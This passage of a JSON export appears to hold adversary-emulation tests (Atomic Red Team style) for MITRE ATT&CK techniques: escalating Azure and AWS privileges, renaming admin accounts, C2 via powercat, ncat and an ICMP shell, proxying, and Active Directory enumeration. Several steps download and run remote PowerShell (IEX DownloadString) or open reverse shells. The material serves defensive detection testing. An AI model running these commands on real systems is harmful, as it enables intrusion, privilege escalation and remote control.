Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure AD username | String | jonh@contoso.com | \n | password | Azure AD password | String | p4sswd | \n | application_name | Name of the targed application | String | test_app | \n | application_permission | Permission from Microsoft Graph Resource API that will be add to application | String | DirectoryRecommendations.Read.All | "}, "executionSteps": [{"description": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = New-AzureADApplication -DisplayName \"#{application_name}\"\n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\n#$aadApplication = Get-AzureADApplication | Where-Object {$_.DisplayName -eq \"#{application_name}\"}\n\n#Get Service Principal of Microsoft Graph Resource API \n$graphSP =  Get-AzureADServicePrincipal -All $true | Where-Object {$_.DisplayName -eq \"Microsoft Graph\"}\n\n#Initialize RequiredResourceAccess for Microsoft Graph Resource API \n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\n$requiredGraphAccess.ResourceAppId = $graphSP.AppId\n$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\n\n#Set Application Permissions\n$ApplicationPermissions = @('#{application_permission}')\n\n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\nif($reqPermission)\n{\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\n$resourceAccess.Type = \"Role\"\n$resourceAccess.Id = $reqPermission.Id    \n#Add required app permission\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\n}\nelse\n{\nWrite-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red\n}\n\n#Add required resource accesses\n$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\n$requiredResourcesAccess.Add($requiredGraphAccess)\n\n#Set permissions in existing Azure AD App\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess\n\n$servicePrincipal = Get-AzureADServicePrincipal -All $true | Where-Object {$_.AppId -eq $aadApplication.AppId}\n\nNew-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\n", "successCriteria": null}], "techniqueIds": ["clacwm6gi03g729mqabj30o2k"], "tags": []}, {"data": {"name": "Azure - adding user to Azure role in subscription", "shortName": "T1098", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The adversarie want to add user to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to user in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n\n\n**Supported Platforms:** iaas:azure\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure AD username | String | jonh@contoso.com | \n | password | Azure AD password | String | p4sswd | \n | user_principal_name | Name of the targeted user (user principal) | String | SuperUser | \n | role_name | Name of the targed Azure role | String | Reader | \n | subscription | Name of the targed subscription | String | Azure subscription 1 | "}, "executionSteps": [{"description": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"#{user_principal_name}\"}\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6gi03g729mqabj30o2k"], "tags": []}, {"data": {"name": "Azure - adding user to Azure AD role", "shortName": "T1098", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The adversarie want to add user to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged authentication administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to service principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see User as a type.\n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure AD username | String | jonh@contoso.com | \n | password | Azure AD password | String | p4sswd | \n | user_principal_name | Name of the targeted user (user principal) | String | SuperUser | \n | role_name | Name of the targed Azure AD role | String | Global Reader | "}, "executionSteps": [{"description": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$user = Get-AzureADUser | where-object {$_.DisplayName -eq \"#{user_principal_name}\"}\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId\nWrite-Host \"User $($user.DisplayName) was added to $($role.DisplayName) role\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6gi03g729mqabj30o2k"], "tags": []}, {"data": {"name": "Azure - adding service principal to Azure role in subscription", "shortName": "T1098", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The adversarie want to add service principal to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to service principal in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n\n\n**Supported Platforms:** iaas:azure\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure AD username | String | jonh@contoso.com | \n | password | Azure AD password | String | p4sswd | \n | service_principal_name | Name of the service principal | String | SuperSP | \n | role_name | Name of the targed Azure role | String | Reader | \n | subscription | Name of the targed subscription | String | Azure subscription 1 | "}, "executionSteps": [{"description": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"#{service_principal_name}\"}\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"} \nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6gi03g729mqabj30o2k"], "tags": []}, {"data": {"name": "Azure - adding service principal to Azure AD role", "shortName": "T1098", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The adversarie want to add service principal to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged authentication administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to service principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.\n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure AD username | String | jonh@contoso.com | \n | password | Azure AD password | String | p4sswd | \n | service_principal_name | Name of the service principal | String | SuperSP | \n | role_name | Name of the targed Azure AD role | String | Global Reader | "}, "executionSteps": [{"description": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$sp = Get-AzureADServicePrincipal | where-object {$_.DisplayName -eq \"#{service_principal_name}\"}\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6gi03g729mqabj30o2k"], "tags": []}, {"data": {"name": "AWS - Create a group and add a user to that group", "shortName": "T1098", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adversaries create AWS group, add users to specific to that group to elevate their privilieges to gain more accesss\n\n\n**Supported Platforms:** iaas:aws\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Name of the AWS group to create | String | atomicredteam | "}, "executionSteps": [{"description": "aws iam create-group --group-name #{username}\naws iam add-user-to-group --user-name #{username} --group-name #{username}\n", "successCriteria": null}], "techniqueIds": ["clacwm6gi03g729mqabj30o2k"], "tags": []}, {"data": {"name": "Admin Account Manipulate", "shortName": "T1098", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Manipulate Admin Account Name\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHa_$x$y$z\n\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        $account = $member.Name -replace \".+\\\\\\\",\"\" # strip computername\\\n        $originalDescription = (Get-LocalUser -Name $account).Description\n        Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48) # Keep original name in description\n        Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\" # Required due to length limitation\n        Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME\n        }\n    }\n", "successCriteria": null}], "techniqueIds": ["clacwm6gi03g729mqabj30o2k", "clacwm1b6001e29mqb4rf3u68"], "tags": []}, {"data": {"name": "Powercat C2", "shortName": "T1095", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | server_ip | The IP address or domain name of the listening server | String | 127.0.0.1 | \n | server_port | The port for the C2 connection | Integer | 80 | "}, "executionSteps": [{"description": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}\n", "successCriteria": null}], "techniqueIds": ["clacwm6lr03ly29mqgh3dh1oy", "clacwm26800m029mqevu0fhga"], "tags": []}, {"data": {"name": "Netcat C2", "shortName": "T1095", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | server_port | The port for the C2 connection | Integer | 80 | \n | ncat_exe | The location of ncat.exe | Path | $env:TEMP\\T1095\\nmap-7.80\\ncat.exe | \n | ncat_path | The folder path of ncat.exe | Path | $env:TEMP\\T1095 | \n | server_ip | The IP address or domain name of the listening server | String | 127.0.0.1 | "}, "executionSteps": [{"description": "cmd /c #{ncat_exe} #{server_ip} #{server_port}\n", "successCriteria": null}], "techniqueIds": ["clacwm6lr03ly29mqgh3dh1oy", "clacwm26800m029mqevu0fhga"], "tags": []}, {"data": {"name": "ICMP C2", "shortName": "T1095", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | server_ip | The IP address of the listening server | String | 127.0.0.1 | "}, "executionSteps": [{"description": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}\n", "successCriteria": null}], "techniqueIds": ["clacwm6lr03ly29mqgh3dh1oy", "clacwm26800m029mqevu0fhga"], "tags": []}, {"data": {"name": "USB Malware Spread Simulation", "shortName": "T1091", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Simulates an adversary copying malware to all connected removable drives. \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$RemovableDrives=@()\n$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID\nForEach ($Drive in $RemovableDrives)\n{\nwrite-host \"Removable Drive Found:\" $Drive\nNew-Item -Path $Drive/T1091Test1.txt -ItemType \"file\" -Force -Value \"T1091 Test 1 has created this file to simulate malware spread to removable drives.\"\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm60802yz29mqhvkm97h8"], "tags": []}, {"data": {"name": "Tor Proxy Usage - Windows", "shortName": "T1090.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | TorExe | Location of tor.exe file. | String | $env:temp\\tor\\Tor\\tor.exe | "}, "executionSteps": [{"description": "invoke-expression 'cmd /c start powershell -Command {cmd /c #{TorExe}}'\nsleep -s 60\nstop-process -name \"tor\" | out-null\n", "successCriteria": null}], "techniqueIds": ["clacwm6hc03hb29mq4w482apl"], "tags": []}, {"data": {"name": "Tor Proxy Usage - MacOS", "shortName": "T1090.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "osascript -e 'tell application \"Terminal\" to do script \"tor\"'\n", "successCriteria": null}], "techniqueIds": ["clacwm6hc03hb29mq4w482apl"], "tags": []}, {"data": {"name": "Tor Proxy Usage - Debian/Ubuntu", "shortName": "T1090.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "sudo systemctl start tor \n", "successCriteria": null}], "techniqueIds": ["clacwm6hc03hb29mq4w482apl"], "tags": []}, {"data": {"name": "Psiphon", "shortName": "T1090.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\n", "successCriteria": null}], "techniqueIds": ["clacwm6hc03hb29mq4w482apl"], "tags": []}, {"data": {"name": "portproxy reg key", "shortName": "T1090.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | connectaddress | Specifies the IPv4 address to which to connect. Acceptable values are IP address, computer NetBIOS name, or computer DNS name. If an address is not specified, the default is the local computer. | String | 127.0.0.1 | \n | connectport | Specifies the IPv4 port, by port number or service name, to which to connect. If connectport is not specified, the default is the value of listenport on the local computer. | String | 1337 | \n | listenport | Specifies the IPv4 port, by port number or service name, on which to listen. | String | 1337 | "}, "executionSteps": [{"description": "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}", "successCriteria": null}], "techniqueIds": ["clacwm6ub03vg29mqex2m9w9r", "clacwm1zk00hd29mq2dbv0z6j"], "tags": []}, {"data": {"name": "Connection Proxy for macOS UI", "shortName": "T1090.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enable traffic redirection on macOS UI (not terminal).\nThe test will modify and enable the \"Web Proxy\" and \"Secure Web Proxy\" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.\n\nNote that this test may conflict with pre-existing system configuration.\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | proxy_server | Proxy server URL (host) | Url | 127.0.0.1 | \n | proxy_port | Proxy server port | Integer | 8080 | \n | interface | Protocol to proxy (http or https) | String | Wi-Fi | "}, "executionSteps": [{"description": "networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}\nnetworksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ub03vg29mqex2m9w9r", "clacwm1zk00hd29mq2dbv0z6j"], "tags": []}, {"data": {"name": "Connection Proxy", "shortName": "T1090.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | proxy_server | Proxy server URL (host:port) | Url | 127.0.0.1:8080 | \n | proxy_scheme | Protocol to proxy (http or https) | String | http | "}, "executionSteps": [{"description": "export #{proxy_scheme}_proxy=#{proxy_server}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ub03vg29mqex2m9w9r", "clacwm1zk00hd29mq2dbv0z6j"], "tags": []}, {"data": {"name": "WinPwn - generaldomaininfo", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Gathers general domain information using the generaldomaininfo function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b"], "tags": []}, {"data": {"name": "Kerbrute - userenum", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerates active directory usernames using the userenum function of Kerbrute\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | Domain | Domain that is being tested against | String | $env:USERDOMAIN | \n | DomainController | Domain Controller that is being tested against | String | $env:UserDnsDomain | "}, "executionSteps": [{"description": "cd $env:temp\n.\\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} $env:TEMP\\username.txt", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b"], "tags": []}, {"data": {"name": "Get-DomainUser with PowerView", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b"], "tags": []}, {"data": {"name": "Enumerate Root Domain linked policies Discovery", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b"], "tags": []}, {"data": {"name": "Enumerate logged on users via CMD (Domain)", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | computer_name | Name of remote system to query | String | %COMPUTERNAME% | "}, "executionSteps": [{"description": "query user /SERVER:#{computer_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b", "clacwm1p800ak29mqhswkfe7k"], "tags": []}, {"data": {"name": "Enumerate Linked Policies In ADSISearcher Discovery", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b"], "tags": []}, {"data": {"name": "Enumerate Default Domain Admin Details (Domain)", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test will enumerate the details of the built-in domain admin account\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net user administrator /domain\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b", "clacwm1p800ak29mqhswkfe7k"], "tags": []}, {"data": {"name": "Enumerate all accounts via PowerShell (Domain)", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net user /domain\nget-localgroupmember -group Users\nget-aduser -filter *\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b", "clacwm1p800ak29mqhswkfe7k"], "tags": []}, {"data": {"name": "Enumerate all accounts (Domain)", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net user /domain\nnet group /domain\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b", "clacwm1p800ak29mqhswkfe7k"], "tags": []}, {"data": {"name": "Enumerate Active Directory Users with ADSISearcher", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b"], "tags": []}, {"data": {"name": "Enumerate Active Directory for Unconstrained Delegation", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain | Domain FQDN | String | $env:UserDnsDomain | \n | uac_prop | UAC Property to search | String | 524288 | "}, "executionSteps": [{"description": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b"], "tags": []}, {"data": {"name": "Automated AD Recon (ADRecon)", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adrecon_path | Path of ADRecon.ps1 file | Path | $env:TEMP\\ADRecon.ps1 | "}, "executionSteps": [{"description": "Invoke-Expression #{adrecon_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b", "clacwm1p800ak29mqhswkfe7k"], "tags": []}, {"data": {"name": "Adfind -Listing password policy", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adfind_path | Path to the AdFind executable | Path | PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe | "}, "executionSteps": [{"description": "#{adfind_path} -default -s base lockoutduration lockoutthreshold 